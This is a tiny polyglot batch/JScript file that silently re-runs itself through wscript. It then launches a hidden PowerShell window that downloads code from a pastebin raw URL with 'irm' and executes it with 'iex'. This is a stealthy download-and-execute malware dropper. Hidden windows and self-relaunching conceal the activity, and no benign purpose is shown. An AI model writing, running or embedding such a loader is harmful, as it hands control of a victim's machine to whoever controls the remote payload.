@echo off
wscript //B //E:JScript "%~F0" & exit /b

<#
/* JScript Section */
var shell = new ActiveXObject("WScript.Shell");
var exec = shell.Exec('powershell.exe -WindowStyle Hidden -Command "irm ''https://pastebin.com/raw/wv1HvG4T'' | iex"');
while (!exec.Status) WScript.Sleep(100);
/* End of JScript Section */
#>
